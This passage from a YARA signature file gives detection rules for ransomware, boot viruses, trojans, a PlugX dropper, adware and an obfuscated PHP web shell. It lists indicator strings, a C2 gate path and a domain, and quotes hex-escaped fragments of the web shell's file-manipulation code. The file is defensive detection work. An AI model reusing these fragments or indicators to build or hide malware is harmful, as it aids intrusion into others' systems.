      $s7 = "cussn\"" fullword ascii
      $s8 = "ycx\\hLkM[=Z>" fullword ascii
      $s9 = "Feus_Yeah_Mace_Gilt_Paid_Iota_Roesow" fullword ascii
      $s10 = "IsIlImInIoIhIiIjIkIdIeIfIgIq" fullword ascii
      $s11 = "YiiiiipD" fullword ascii
      $s12 = "=8=>=O=" fullword ascii 
      $s13 = "626?6b6o6" fullword ascii 
      $s14 = "ySxLh<k=[-Z." fullword ascii
      $s15 = "Nockcuss.4foalpray8utloft-13" fullword ascii
      $s16 = "D$t_^[" fullword ascii
      $s17 = "IrIbIRIBI2I\"I" fullword ascii
      $s18 = "ysxlh\\k][MZN" fullword ascii
      $s19 = "5B5H5g5" fullword ascii
      $s20 = "jeHRLgPiTe({*+" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule Ramsom_Radamant {
   meta:
      filename = "MAL - file Ramsom_Radamant.ViR"
      hash1 = "2c4c8066a1a7dfdf42c57ff4f9016f1ba05bcb004ff8b0ffc0989165d2ad30e2"
   strings:
      $s1 = "directx.exe" fullword wide
      $s2 = "__Z12exec_commandPc" fullword ascii
      $s3 = "__imp__ShellExecuteA@24" fullword ascii
      $s4 = "_ShellExecuteA@24" fullword ascii
      $s5 = "__Z19IsUserElevatedAdminv" fullword ascii
      $s6 = "_WinExec@8" fullword ascii
      $s7 = "__imp__WinExec@8" fullword ascii
      $s8 = "__head_libshell32_a" fullword ascii
      $s9 = "__Z20GetEncryptedFileSizePi" fullword ascii
      $s10 = "__imp__GetKeyboardType@4" fullword ascii
      $s11 = "_ZZ11aes_set_keyE7kt_init" fullword ascii
      $s12 = "__Z9getmyHASHPc" fullword ascii
      $s13 = "__Z17getWindowsVersionPc" fullword ascii
      $s14 = "_ZZ11aes_set_keyE7ft_init" fullword ascii
      $s15 = "_GetKeyboardType@4" fullword ascii
      $s16 = "__Z8DownloadPc" fullword ascii
      $s17 = "_SHGetFolderPathA@20" fullword ascii
      $s18 = "__Z14getBuildNumberv" fullword ascii
      $s19 = "__Z8GetBitIPPc" fullword ascii
      $s20 = "_GetCurrentHwProfileA@4" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule Ransomware_Satana {
   meta:
      filename = "MAL - file Ransomware_Satana.bin"
      hash1 = "683a09da219918258c58a7f61f7dc4161a3a7a377cf82a31b840baabfb9a4a96"
   strings:
      $s1 = "5rhQJGe:aT6waT1WbQFkhsIwagVQHWtRFP3UHRdQkQFgZ0JQ21Mw1TPdWMVQa@DdWGhEAA7QWQ3eBdleGBBQWR7NBtN@DV3QGtkMK{dGWRRQB33sJi6MBBHQ@RkGZDAm" ascii
      $s2 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii
      $s3 = "re xmlns:ms_windowsSettings=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\" xmlns=\"http://schemas.microsoft.com/SMI/2" ascii
      $s4 = "d:\\lbetwmwy\\uijeuqplfwub.pdb" fullword ascii
      $s5 = "FQ7QKkFfFQ7QKkKvKkFfFQ7QKkFfFQ7QKkFfFf7fFQ7QKkFfFQ7QKkFfFQ7Q4k7QKkFfFQ7QKkFfFQ7QKkKvKkFfFQ7QKkFfFQ7QKkFfFf7fFQ7QKkFfFQ7QKkFfFQ7Q" ascii
      $s6 = "NiLI[r31@U0dUo0p7UZ[WBFE7Ua:,e3:hkFZkWV2kny:SRKnHJV2`3gjy,3Unr:kFT;YTtwjDVUlGREY,Y:jeyEdeg3waTFQfKVtZQFOZiPoJQD:,QFOZrv,aBwjuUD;" ascii
      $s7 = "SkhNK{hZBLMEHG;,dWpvSzdQOGhlWPVlOG3UWFziE@RfLdJbVUwYSQ;@GlF4agEwAddeBtikTHBRet[RA0Fpt2dGJ@VjOzFkBd7NBfNsZhlF@bERPBoOZBUdFQ6BjhzQ" ascii
      $s8 = "FRkMGdJZB{hJFQ:MVF2J@T2wF371FWhEKtdJWQF:ARtf@F3sBkNGDlMAWW7YGA;QDV35GAhLAPhIBdswFQF6sztABQJYPAFrIWlhHUgMEVdfFEYeWVBYAQUMKkALaVdh" ascii
      $s9 = "1ntO6D,vVb{u4r:u@4EVdi3KNQJPpR[YFn4vqQEuDWqnufGZ;USP;AQm@(QihQWvF5u{EHRZdo5h@{eh`Ak{Fi;EmftpNqEN3AZ:AeDQKvGdUeKz3[nPfAoWDKoD;Q[{" ascii
      $s10 = "Ftp2rndRFn{vFAUyOB@QKrwlMsFPaMYuFIFV7A2uQs[mf{Kmq3mwn4U0qQKms1(hP[Yes6EesTOaqL[2hBZQ6TEbOjupon3QaD2wFapzNyZQqrDqbNUPOD1{Grwl,s;Q" ascii
      $s11 = "ogF`FRw7FduAKL;ZFtplhABOhD0swuARDq6j1((RDMVH[klRoGR7ho;4aE;7hYMeLIGoLIRPKrzU@55N@:F7FUGQIa2K@sG[ITOaHIIeqIBo;YGoHIemoE6DK77OBqBE" ascii
      $s12 = "4$4*4B4_4" fullword ascii
      $s13 = "ewsyeor" fullword ascii
      $s14 = "fxpusugcfbhgdacizktsh" fullword ascii
      $s15 = "mvcknsyo" fullword ascii
      $s16 = "blfmaqhzknqdixy" fullword ascii
      $s17 = "tydqcgfwwka" fullword ascii
      $s18 = "kaxkytpp" fullword ascii
      $s19 = "mtkedgildxvj" fullword ascii
      $s20 = "qwvywvszdcvle" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule Quax_A_BOOT {
   meta:
      filename = "MAL - file Quax_A_BOOT.IMA"
      hash1 = "6bc1d767c96b93518f185cfa1eede06fabe2c1c8968160a02e26b0fcec4bc35b"
   strings:
      $s1 = "VGALOGO" fullword ascii
      $s2 = "KeyTable USA --\\(:2" fullword ascii
      $s3 = "\\6\\6\\>" fullword ascii
      $s4 = "\\??{*3;?0" fullword ascii
      $s5 = "SCONFIG" fullword ascii
      $s6 = "HPSYSTEM" fullword ascii
      $s7 = "VGALOGO RL_ " fullword ascii
      $s8 = "VGALOGO LG_ " fullword ascii
      $s9 = "?}1.02 - 02/19/92)" fullword ascii
      $s10 = "* Bceuk" fullword ascii
      $s11 = "kxkxkxkxkxj" fullword ascii
      $s12 = "kwossov" fullword ascii
      $s13 = "ccggeeii" fullword ascii
      $s14 = "sjsosssvs" fullword ascii
      $s15 = "Windows 3.10 Support for 386MAX" fullword ascii
      $s16 = "COMMDLG DL_ " fullword ascii
      $s17 = "SYSTEM  SR_ " fullword ascii
      $s18 = "HPSYSTEMDR_ " fullword ascii
      $s19 = "SCONFIG DL_ " fullword ascii
      $s20 = "KEYBOARDDR_ " fullword ascii
   condition:
      uint16(0) == 0x33fa and filesize < 4000KB and
      8 of them
}

rule Nyb_Boot {
   meta:
      filename = "MAL - file Nyb_Boot.ima"
      hash1 = "d206be47455ceceac21225dee5a9c5605da7a90f0563a022a7299d0d2bff0c3b"
   strings:
      $x1 = "$  Enter a choice: $F5=Bypass startup files F8=Confirm each line of CONFIG.SYS and AUTOEXEC.BAT [ ]$ [Y,N]?$YES$NO $Time remaini" ascii
      $x2 = "$  Enter a choice: $F5=Bypass startup files F8=Confirm each line of CONFIG.SYS and AUTOEXEC.BAT [ ]$ [Y,N]?$YES$NO $Time remaini" ascii
      $x3 = "$MS-DOS is bypassing your CONFIG.SYS and AUTOEXEC.BAT files." fullword ascii
      $s4 = "ng: $Enter correct name of Command Interpreter (eg, C:\\COMMAND.COM)" fullword ascii
      $s5 = "$Process AUTOEXEC.BAT [Y,N]?$WARNING! Logical drives past Z: exist and will be ignored" fullword ascii
      $s6 = "\\MSDOS\\COMMAND.COM" fullword ascii
      $s7 = "\\DOS\\COMMAND.COM" fullword ascii
      $s8 = "C:\\DBLSPACE.BIN" fullword ascii
      $s9 = "$MS-DOS will prompt you to confirm each CONFIG.SYS command." fullword ascii
      $s10 = "\\CONFIG.SYS" fullword ascii
      $s11 = "C:\\DRVSPACE.BIN" fullword ascii
      $s12 = "MS DOS Version 6 (C)Copyright 1981-1994 Microsoft Corp Licensed Material - Property of Microsoft All rights reserved NUL" fullword ascii
      $s13 = "DMS DOS Version 6 (C)Copyright 1981-1994 Microsoft Corp Licensed Material - Property of Microsoft All rights reserved <" fullword ascii
      $s14 = "C:\\DRVSPACE.INI" fullword ascii
      $s15 = "$Wrong DBLSPACE.BIN version" fullword ascii
      $s16 = "Incorrect order in CONFIG.SYS line $Error in CONFIG.SYS line $ONOFFStarting MS-DOS..." fullword ascii
      $s17 = "A:\\MSDOS /P" fullword ascii
      $s18 = "RVSPACEBIN" fullword ascii
      $s19 = "GALOGO LG_ " fullword ascii
      $s20 = "GALOGO RL_ " fullword ascii
   condition:
      uint16(0) == 0x3eeb and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Parity_Boot_B_BOOT {
   meta:
      filename = "MAL - file Parity_Boot_B_BOOT.IMA"
      hash1 = "b1ece5a4f8747ffed86435402edcafcad4467bb9167f90e63ef8367b7a3b5d0b"
   strings:
      $s1 = "NO NAME    FAT12   " fullword ascii
      $s2 = "ppqsttwxzzz}}}~i" fullword ascii
      $s3 = "8<]nqolOpxo" fullword ascii
      $s4 = "SQFUVN\\:QeR" fullword ascii
      $s5 = "USTOM  000 " fullword ascii
      $s6 = "SEARCH DAT " fullword ascii
      $s7 = "LLOPRRSSUUVWXYZ[\\\\" fullword ascii
      $s8 = "SUUVWXYZ[\\\\" fullword ascii
      $s9 = "_\\R`aYfC[]^" fullword ascii
      $s10 = "DGNSQ]c:NNa" fullword ascii
      $s11 = "twxzzz}}}~i" fullword ascii
      $s12 = "A_MENU EXE " fullword ascii
      $s13 = "pqsttwxzzz}}}~i" fullword ascii
      $s14 = "SEARCH IDX " fullword ascii
      $s15 = ">>?@AABCDEFZ]" fullword ascii
      $s16 = "lj_mnfsPlrx" fullword ascii
      $s17 = ">>?@AABCDEFXHl" fullword ascii
      $s18 = "UUVWXYZ[\\\\" fullword ascii
      $s19 = "xzzz}}}~i" fullword ascii
      $s20 = "A_TRAK EXE " fullword ascii
   condition:
      uint16(0) == 0x3ceb and filesize < 30KB and
      8 of them
}

rule PlugX_RTF_dropper {
   meta:
      filename = "MAL - file PlugX_RTF_dropper"
      hash1 = "ac7d02465d0b1992809e16aaae2cd779470a99e0860c4d8a2785d97ce988667b"
   strings:
      $s1 = "00200020003c0078003a004f0057004300560065007200730069006f006e003e00310030002e0030002e0030002e003500360030003500200020002000200020" ascii
      $s2 = "750072006e003a0073006300680065006d00610073002d006d006900630072006f0073006f00660074002d0063006f006d003a006f006600660069006300" ascii
      $s3 = "3a004f0057004300560065007200730069006f006e003e00310030002e0030002e0030002e00350036003000350020002000200020002000200020002000" ascii
      $s4 = "656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d2261636365" ascii
      $s5 = "0078006d006c00200078006d006c006e0073003a0078003d002200750072006e003a0073006300680065006d00610073002d006d006900630072006f0073006f" ascii
      $s6 = "006300000000005e000000530061006d0070006c00650020004e006f00640065007800780078007800780078007800780078007800780078007800780078" ascii
      $s7 = "6c00650020004e006f00640065007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800" ascii
      $s8 = "6c00650020004e006f00640065007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800" ascii
      $s9 = "656e74323d22616363656e74322220616363656e74333d22616363656e74332220616363656e74343d22616363656e74342220616363656e74353d2261636365" ascii 
      $s10 = "00650020004e006f0064006500780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078007800780078" ascii
      $s11 = "00700070007000700070007000700070" ascii 
      $s12 = "002f0078003a004800650069006700680074003e" ascii 
      $s13 = "{\\title A* }{\\author blursight}{\\operator blursight}{\\creatim\\yr2013\\mo3\\dy13\\hr17\\min7}{\\revtim\\yr2013\\mo3\\dy13\\h" ascii
      $s14 = "0043006f006e00740065006e00740073" ascii 
      $s15 = "0078007800780078007800780078007800780078007800780078007843006f006e00740065006e00740073000000000000000000000000000000000000000000" ascii
      $s16 = "003a0065007800630065006c0022003e" ascii 
      $s17 = "26262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626" ascii
      $s18 = "262626262626262626262626262626262626262626262626262626262626262626262626262626262626" ascii 
      $s19 = "00530061006d0070006c00650020004e006f0064006500780078007800780078007800780078007800780078007800" ascii
      $s20 = "7468656d652f7468656d652f7468656d65" ascii 
   condition:
      uint16(0) == 0x5c7b and filesize < 2000KB and
      8 of them
}

rule TOKYO_MAL_Phoenix {
   meta:
      filename = "MAL - file TOKYO_MAL_Phoenix.EXE"
      hash1 = "58e61318aad78f21aa08c54c55d8f130b409de43cb776fdfa0ebb6edf3f09dc6"
   strings:
      $s1 = "HOST #2 - You have just released a virus!$" fullword ascii
      $s2 = "!(C) 1993 American Eagle Publications Inc., All Rights Reserved. Unauthorized " fullword ascii
      $s3 = "use will be prosecuted under applicable copyright and software piracy laws." fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2KB and
      all of them
}

rule _Proteus_Botnet_Ransomware_neurevt_0 {
   meta:
      filename = "MAL - from files Proteus_Botnet.exe, Ransomware_neurevt.exe"
      hash1 = "d23b4a30f6b1f083ce86ef9d8ff434056865f6973f12cb075647d013906f51a2"
      hash2 = "517ac5506a5488a1193686f66cb57ad3288c2258c510004edb2f361b674526cc"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii
      $s4 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s5 = "System.Runtime.CompilerServices" fullword ascii 
      $s6 = "System.Reflection" fullword ascii 
      $s7 = "System" fullword ascii 
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( all of them )
      ) or ( all of them )
}

rule trojan_rombertik_fugrafa {
   meta:
      filename = "MAL - file trojan_rombertik_fugrafa.exe"
      hash1 = "c2581af6d4ff858b9fdf6c3bb6c32f988873057c0c28342b4c4bfa659ca5c0a8"
   strings:
      $s1 = "chrome.dll" fullword ascii
      $s2 = "Ws2_32.dll" fullword ascii
      $s3 = "aWV4cGxvcmUuZXhl" fullword ascii 
      $s4 = "ZXhwbG9yZXIuZXhl" fullword ascii
      $s5 = "network.http.spdy.enabled.v3" fullword ascii
      $s6 = "www.centozos.org.in" fullword ascii
      $s7 = "Carbon crack attempt, failed" fullword ascii
      $s8 = "network.http.spdy.enabled.v3-1" fullword ascii
      $s9 = "network.http.spdy.enabled" fullword ascii
      $s10 = "content-type: multipart/form-data" fullword ascii
      $s11 = "content-length: 0" fullword ascii
      $s12 = "/don1/gate.php" fullword ascii
      $s13 = "f/don1/gate.php" fullword ascii
      $s14 = "runscope/0.1" fullword ascii
      $s15 = "GPADDINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii
      $s16 = "PPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN" ascii

   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule virus_Slow_Format {
   meta:
      filename = "MAL - file virus_Slow_Format.com"
      hash1 = "37a98d8ae7084bf9c92f19d309725df65e601935fa502cfe824eab722cf8d043"
   strings:
      $s1 = "!Insert COMMAND.COM Diskette" fullword ascii
      $s2 = "Version Virus .. January 1992" fullword ascii
   condition:
      uint16(0) == 0x2aeb and filesize < 2KB and
      all of them
}

rule Obfuscated_Backdoor_webshells {
   meta:
      filename = "MAL - file mini.php"
      hash1 = "c6533fc0fcb09daa457c4e929905af0840a24627dad8a9b5429d138c19daafc7"
   strings:
      $s1 = "<?php ${\"GL\\x4f\\x42\\x41\\x4cS\"}[\"\\x71\\x7a\\x71\\x65gbq\\x73\"]=\"\\x69n\\x66o\";${\"G\\x4c\\x4f\\x42AL\\x53\"}[\"ufy\\x7" ascii
      $s2 = "ho\"\\x3c/tr\\x3e</\\x74d>\\x3c/tab\\x6ce>\\x3cbr\\x20/\\x3e\";echo(\"<\\x70r\\x65>\".htmlspecialchars(file_get_contents($_GET[" ascii
      $s3 = "x74\\x65\\x78ta\\x72ea col\\x73=8\\x30 row\\x73=\\x32\\x30 \\x6e\\x61\\x6d\\x65=\\\"\\x73r\\x63\\\"\\x3e\".htmlspecialchars(file" ascii
      $s4 = "\\x6c\\x64\\x71\"]}.\"/\".$_POST[\"\\x6ee\\x77\\x6e\\x61\\x6de\"])){echo\"<f\\x6f\\x6e\\x74\\x20c\\x6f\\x6c\\x6f\\x72\\x3d\\x22" ascii
      $s5 = "\\x20me\\x74\\x68o\\x64=\\\"POST\\\"\\x3e\\n\\x4eew\\x20\\x4e\\x61me :\\x20<\\x69nput\\x20\\x6eam\\x65\\x3d\\\"n\\x65w\\x6eam\\x" ascii
      $s6 = "\\x72\\x20/><\\x63\\x65\\x6ete\\x72>\".$_POST[\"pa\\x74\\x68\"].\"\\x3c\\x62\\x72\\x20/>\\x3c\\x62r />\";if($_POST[\"\\x6fp\\x74" ascii
      $s7 = "error_reporting(0);$lgclayedxhl=\"\\x70\\x61t\\x68\\x73\";$rielgprjvfg=\"\\x70\\x61\\x74\\x68\";set_time_limit(0);$rlbtdfgm=\"" ascii
      $s8 = "{\"\\x47L\\x4f\\x42\\x41L\\x53\"}[\"l\\x6db\\x79\\x76y\\x66\"]}=$_GET[\"path\"];}else{$jmoqpfeelgx=\"\\x70\\x61t\\x68\";${$jmoqp" ascii
      $s9 = "76\\x61lu\\x65=\\\"\\x47o\\\"\\x20/\\x3e\\n\\x3c/f\\x6f\\x72m>\";}elseif($_POST[\"\\x6fp\\x74\"]==\"e\\x64\\x69\\x74\"){if(isset" ascii
      $s10 = "isset($_POST[\"\\x70\\x65\\x72m\"])){if(chmod($_POST[\"\\x70\\x61th\"],$_POST[\"p\\x65\\x72m\"])){echo\"\\x3cfont\\x20\\x63ol\\x" ascii
      $s11 = "/\\x3e\\n\\x3c/for\\x6d>\";}elseif($_POST[\"\\x6fpt\"]==\"r\\x65\\x6eame\"){if(isset($_POST[\"newn\\x61\\x6d\\x65\"])){${\"\\x47" ascii
      $s12 = "x6ce\\x74\\x65\"){if($_POST[\"\\x74y\\x70e\"]==\"dir\"){if(rmdir($_POST[\"\\x70a\\x74h\"])){echo\"\\x3c\\x66ont c\\x6f\\x6c\\x6f" ascii
      $s13 = "  \\x20\\x20  \\x20 \\x20\\x20 \\x20</f\\x6f\\x6et\\x3e<\\x62\\x72/\\x3e\";}}elseif($_POST[\"\\x74yp\\x65\"]==\"\\x66i\\x6c\\x65" ascii
      $s14 = "68\\x79\\x74\"]}=fopen($_POST[\"pa\\x74h\"],\"\\x77\");if(fwrite(${${\"GLOB\\x41\\x4c\\x53\"}[\"\\x78\\x66fr\\x73\\x6e\\x6a\\x77" ascii
      $s15 = "4\\x64\\x3e<fo\\x6e\\x74\\x20co\\x6co\\x72=\\x22\\x77h\\x69\\x74\\x65\\\">Pa\\x74h :\\x3c/f\\x6fn\\x74\\x3e\\x20\";if(isset($_GE" ascii
      $s16 = ">\\x47\\x61\\x6e\\x74i\\x20N\\x61ma\\x20Gag\\x61l\\x3c/font><\\x62r\\x20/\\x3e\";}$_POST[\"name\"]=$_POST[\"\\x6e\\x65wname\"];}" ascii
      $s17 = "73ubmi\\x74\\x22 va\\x6c\\x75e=\\x22\\x75p\\x6c\\x6fa\\x64\\x22\\x20/\\x3e\\n\\x3c/f\\x6f\\x72\\x6d\\x3e\\n\\x3c/\\x74d\\x3e\\x3" ascii
      $s18 = "/\\x74\\x61\\x62l\\x65\\x3e\\x3cb\\x72/\\x3e\\x3c\\x63\\x65nt\\x65\\x72\\x3e\";if(isset($_GET[\"\\x6fpti\\x6fn\"])&&$_POST[\"\\x" ascii
      $s19 = "])).\"\\x3c/p\\x72e>\");}elseif(isset($_GET[\"opt\\x69on\"])&&$_POST[\"\\x6fp\\x74\"]!=\"de\\x6ce\\x74\\x65\"){echo\"</\\x74\\x6" ascii
      $s20 = "}=>${$ibjbwuwapcd}){${\"\\x47LO\\x42AL\\x53\"}[\"iwv\\x75\\x6e\\x71\\x64\\x6djn\"]=\"\\x6be\\x79\";$_POST[${${\"G\\x4cO\\x42\\x4" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      any of them
}

rule adwareSomoto_betterinstaller {
   meta:
      filename = "MAL - file 7ZipSetup.exe"
      hash1 = "ddf2542dc5ac74a98d5ee9e55497572104d6c880aad9137caf884d10ca5953ce"
   strings:
      $x1 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><filename>" ascii
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAss" ascii
      $s3 = "ependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"" ascii
      $s4 = " Install System v2.46</filename><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii
      $s5 = "uireAdministrator\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsof" ascii
      $s6 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii
      $s7 = "m:compatibility.v1\"><application><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supportedOS Id=\"{e2011457-1546-4" ascii
      $s8 = "SHFOLDER" fullword ascii
      $s9 = "SeShutdownPrivilege" fullword ascii
      $s10 = "joTbdkt@" fullword ascii
      $s11 = "GGGs555V" fullword ascii
      $s12 = "ljIv\\K" fullword ascii
      $s13 = "0uwta$:`." fullword ascii
      $s14 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii 
      $s15 = "8 _?=u" fullword ascii 
      $s16 = "9ayJW\\[" fullword ascii
      $s17 = "BipCWGtX" fullword ascii
      $s18 = ":sIfM_/P%" fullword ascii
      $s19 = "3,('>2,+AQJIr\\RR" fullword ascii
      $s20 = "FTCzG|m" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule TrojanAnsi_dbaw {
   meta:
      filename = "MAL - file ANSI881.ANS"
      hash1 = "d7eee29a6b0c8dd1acfeb23d89342e4e8703a13cc806c0f8cfdb17d01cb85b98"
   strings:
      $s1 = "[92;92;13;\"ren ANSIVIR.ANS  x.com\";13;120;13;\"ren x.com ANSIVIR.ANS \";13;\"cls\";13;13p    " fullword ascii
      $s2 = "[0;32m" fullword ascii
      $s3 = "[0;1;30m" fullword ascii
      $s4 = "[5;31m" fullword ascii
      $s5 = "[1;37m" fullword ascii
      $s6 = "[5;31;42m" fullword ascii
      $s7 = "[1;5;37m" fullword ascii
   condition:
      uint16(0) == 0xe94d and filesize < 2KB and
      all of them
}

rule VirusTrivial_sillyoc {
   meta:
      filename = "MAL - file Trivial.Html.883.HTM"
      hash1 = "fb2f58a5be81430872ae90987ab01c1d637574f4ebb222f437ef956245031477"
   strings:
      $s1 = "  <frame name=\"top\" scrolling=\"no\" noresize target=\"contents\" src=\"topframe.htm\">" fullword ascii
      $s2 = "  <frame name=\"bottom\" scrolling=\"no\" noresize target=\"contents\" src=\"botframe.htm\"" fullword ascii
      $s3 = "    <frame name=\"contents\" target=\"main\" src=\"menu.htm\" scrolling=\"no\" noresize>" fullword ascii
      $s4 = "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage 3.0\">" fullword ascii
      $s5 = "  <frameset cols=\"152,*\">" fullword ascii
      $s6 = "  </frameset>" fullword ascii
      $s7 = "  <noframes>" fullword ascii
      $s8 = "  </noframes>" fullword ascii
      $s9 = "  <p>This page uses frames, but your browser doesn't support them.</p>" fullword ascii
      $s10 = "<frameset framespacing=\"0\" border=\"false\" frameborder=\"0\" rows=\"50,*,45\">" fullword ascii
      $s11 = "    <frame name=\"main\" src=\"main.htm\" scrolling=\"auto\" noresize>" fullword ascii
      $s12 = "  marginheight=\"9\">" fullword ascii

   condition:
      uint16(0) == 0x683c and filesize < 2KB and
      any of them
}

rule virus_trvild{
   meta:
      filename = "MAL - file LSD.ANS"
      hash1 = "594673d9a5ca9ffca6032b751fb510eac4fc41e436df7c5a224b3f44bda4c15f"
   strings:
      $s1 = "[37mD - Its back and better then before - L" fullword ascii
      $s2 = "[37mLiquid Speed Dome - 1.905.735.8670 - NuP: idioplasm" fullword ascii
      $s3 = "[1;30m6000+ EXE/COM Virus/Trojan Files" fullword ascii
      $s4 = "[1;30m800+ ASM Virus/Trojan Source Code" fullword ascii
      $s5 = "[1;30mWorld Head Quarters of D" fullword ascii
      $s6 = "[1;30mWorld Head Quarters of MassacreNEt" fullword ascii
      $s7 = "[1;30m8,000+ PHACT Files" fullword ascii
      $s8 = "[1;30mSupporting from 14,4" fullword ascii
      $s9 = "[1;30mRunning Renegade/Custom" fullword ascii
      $s10 = "[C- aka LSD" fullword ascii
      $s11 = "[1;30mMassacreNet Member [19124:19124/0]" fullword ascii
      $s12 = "[1;30m98.5% Totally PHACTV/Occult/Privat" fullword ascii
      $s13 = "[1;30mGreat Occult/UFO/Virii Bases" fullword ascii
      $s14 = "[1;30mStrict Voting S" fullword ascii
      $s15 = "[1;30mMany great affils (virii/phact)" fullword ascii
      $s16 = "[1;30mOnline Trojan/Renegade-Hack Writin" fullword ascii

   condition:
      uint16(0) == 0x5b1b and filesize < 20KB and
      8 of them
}

rule trojanKuluoz_razy {
   meta:
      filename = "MAL - file d0000.dll"
      hash1 = "c56792bea8ac5fbf893ae3df1be0c3c878a615db6b24fd5253e5cbbc2e3e1dd3"
   strings:
      $x1 = "C:\\Users\\DmitryHELL\\Documents\\SysIQUA\\loader_1.4 s\\loader_v4\\loader_v3\\Release\\dll.pdb" fullword ascii
      $s2 = "SharedIntApp.exe" fullword ascii
      $s3 = "vmtoolsd.exe" fullword ascii
      $s4 = "vmsrvc.exe" fullword ascii
      $s5 = "wireshark.exe" fullword ascii
      $s6 = "vmusrvc.exe" fullword ascii
      $s7 = "iptools.exe" fullword ascii
      $s8 = "ProcessHacker" fullword ascii
      $s9 = "Dumper64" fullword ascii
      $s10 = "prl_tools.exe" fullword ascii
      $s11 = "prl_cc.exe" fullword ascii
      $s12 = "Iris - Version 5.59" fullword ascii
      $s13 = ">`IsWow64Process" fullword ascii
      $s14 = "For group!!!!!" fullword ascii
      $s15 = "<knock><id>%s</id><group>%s</group><src>%d</src><transport>%d</transport><time>%d</time><version>%d</version><status>%d</status>" ascii
      $s16 = "For base!!!!!" fullword ascii
      $s17 = "<knock><id>%s</id><group>%s</group><src>%d</src><transport>%d</transport><time>%d</time><version>%d</version><status>%d</status>" ascii
      $s18 = "ProcessLasso_Notification_Class" fullword ascii
      $s19 = "HARDWARE\\filename\\System\\BIOS" fullword ascii
      $s20 = "SYSTEM\\CurrentControlSet\\services\\Disk\\Enum" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule trojanAndrom_bulz {
   meta:
      filename = "MAL - file WalmartForm_San_Antonio_78218.exe"
      hash1 = "f1b8a10f27cc597281bdd423fd7e9829ecbf036ebe6e7e00d054c55f01454bd8"
   strings:
      $s1 = "  processorArchitecture=\"X86\" " fullword ascii
      $s2 = "  version=\"1.0.0.0\" " fullword ascii
      $s3 = "    processorArchitecture=\"X86\" " fullword ascii
      $s4 = "kERnel32" fullword ascii
      $s5 = "    publicKeyToken=\"6595b64144ccf1df\" " fullword ascii
      $s6 = "czfxijklm" fullword ascii
      $s7 = "  name=\"CompanyName.ProductName.YourApp\" " fullword ascii
      $s8 = "    version=\"6.0.0.0\" " fullword ascii
      $s9 = "MONETARYCTYPE" fullword ascii
      $s10 = "ABCDKGHIJKLMNOP" fullword ascii
      $s11 = " <filename>Your application filename here.</filename> " fullword ascii
      $s12 = "    name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
      $s13 = "\\kASV1 lh" fullword ascii
      $s14 = "bLogical D:kBanager" fullword ascii
      $s15 = "~gxfXfAX" fullword ascii
      $s16 = "K~areSOgW" fullword ascii
      $s17 = "Sstd5pu" fullword ascii
      $s18 = "\"KbnC}F:ug" fullword ascii
      $s19 = ".Typ\\T" fullword ascii
      $s20 = "YGuGo^S" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule trojanRazy_msil {
   meta:
      filename = "MAL - file hostr.exe"
      hash1 = "6f201afc797370ac6e33fafec41a794a2eb44c1bfd7d9079e3633ebe7bbb41e1"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii
      $s3 = "max.exe" fullword wide
      $s4 = "My.Computer" fullword ascii
      $s5 = "MyTemplate" fullword ascii
      $s6 = "My.WebServices" fullword ascii
      $s7 = "Xv2nchCx5xMOhIbiNe" fullword ascii
      $s8 = "Microsoft.VisualBasic" fullword ascii
      $s9 = "MyProject" fullword ascii
